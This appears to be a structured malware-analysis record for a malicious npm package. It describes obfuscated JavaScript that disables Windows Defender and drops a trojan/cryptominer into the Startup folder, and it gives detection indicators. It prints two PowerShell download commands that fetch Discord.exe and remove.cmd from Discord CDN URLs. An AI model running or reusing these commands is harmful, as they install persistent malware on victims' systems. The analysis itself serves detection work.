package_info.why_malicious: The package contains heavily obfuscated JavaScript code that disables Windows Defender and other security protections, downloads and executes a known trojan/cryptominer, and attempts anti-forensics. Its behavior is entirely inconsistent with its claimed functionality and is designed to compromise and persist on victim systems.

execution_context.trigger: import-time or runtime (when checker.js is loaded/executed)

malicious_snippets.code_behavior: At import-time or runtime, the code executes a series of Windows registry modifications and scheduled task changes to disable Windows Defender, tamper protection, real-time protection, and related security features, as well as hiding Defender UI elements. This disables security protections and makes the system vulnerable to further compromise.

malice_analysis.why_suspicious: Disabling security software and protections is a classic precursor to malware installation and persistence.
malice_analysis.violated_expectations: A legitimate npm package should not alter system security settings or disable antivirus/antimalware protections.
malice_analysis.similar_legitimate_use: Enterprise IT scripts may disable Defender for compatibility, but never in a userland package or without explicit admin consent.
key_indicators: Direct registry modifications to security settings
Disabling real-time protection and tamper protection

malicious_snippets.code_snippet:
cmd('runSync')('powershell -c Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/982769804823205/982820209623296860/Discord.exe -OutFile %USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Discord.exe');
cmd('runSync')('powershell -c Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/982769804823205/982820209944326669/remove.cmd -OutFile remove.cmd');
malicious_snippets.code_behavior: At import-time or runtime, the code downloads a known trojan/cryptominer binary ('Discord.exe') and a secondary script ('remove.cmd') from Discord CDN, saving them to the user's startup folder and local directory, enabling persistence and further malicious actions.

malice_analysis.why_suspicious: Downloading and executing binaries from external sources, especially from Discord CDN, is a hallmark of malware delivery.
malice_analysis.violated_expectations: Legitimate packages should not download or execute external binaries, especially from non-official sources.
malice_analysis.similar_legitimate_use: Rarely, legitimate updaters may fetch binaries, but never from Discord CDN or without user consent.
key_indicators: Use of Discord CDN for payload delivery
Dropping executable to Startup folder for persistence

execution_context.trigger: runtime (when Discord.exe is executed via Startup)

malicious_snippets.code_behavior: At system startup, the trojan binary executes, decrypts embedded malicious code, and likely performs cryptomining or further system compromise, as indicated by VirusTotal and the presence of encrypted payloads.

malice_analysis.why_suspicious: The binary is a known trojan/cryptominer, uses encrypted payloads, and is dropped by a malicious npm package.
malice_analysis.violated_expectations: No npm package should ever install or execute a .NET binary on user systems.
malice_analysis.similar_legitimate_use: None in the context of npm packages.

attack_chain.action: Obfuscated JavaScript disables Windows Defender and related protections via registry and scheduled task modifications.
attack_chain.leads_to: System is left unprotected, allowing further malware actions.

attack_chain.action: Malicious code downloads and drops a trojan/cryptominer binary and a secondary script from Discord CDN.
attack_chain.leads_to: Trojan binary is placed in Startup folder for persistence.

attack_chain.action: Trojan binary executes at system startup, decrypts and runs further malicious payloads (e.g., cryptomining, data theft).
attack_chain.leads_to: System compromise, persistence, and potential resource theft or further attacks.

behavioral_signatures: Obfuscated JavaScript in npm packages that executes shell or PowerShell commands
Registry modifications targeting Windows Defender and security features
Downloading executables/scripts from Discord CDN or other non-standard sources
Dropping binaries into Startup folders for persistence
file_indicators: Registry keys under HKLM\Software\Microsoft\Windows Defender modified
detection_knowledge.how_to_detect: Monitor npm packages for obfuscated JavaScript that executes shell or PowerShell commands, especially those modifying Windows Defender registry keys or scheduled tasks. Flag any package that downloads executables from Discord CDN or similar non-standard sources. Alert on creation of suspicious binaries in Startup folders and on registry changes disabling security features. Use YARA rules to detect obfuscated code patterns and known malicious payload hashes.
